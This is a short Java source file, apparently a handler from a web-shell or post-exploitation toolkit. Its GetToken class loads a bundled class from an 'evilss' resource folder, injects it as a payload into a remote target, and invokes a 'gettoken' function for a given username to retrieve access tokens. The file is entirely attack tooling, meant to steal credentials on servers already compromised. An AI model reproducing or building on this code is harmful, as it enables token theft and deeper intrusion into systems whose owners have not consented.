/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.theplutin.handler;

import util.functions;
import util.http.ReqParameter;

/**
 *
 * @author Administrator
 */
public class GetToken extends HandlerBase{

    public String handler(String username){
        this.payload.include("GetToken", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/GetToken.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("username", username);
        return encoding.Decoding(payload.evalFunc("GetToken", "gettoken", reqParameter));
    }
}
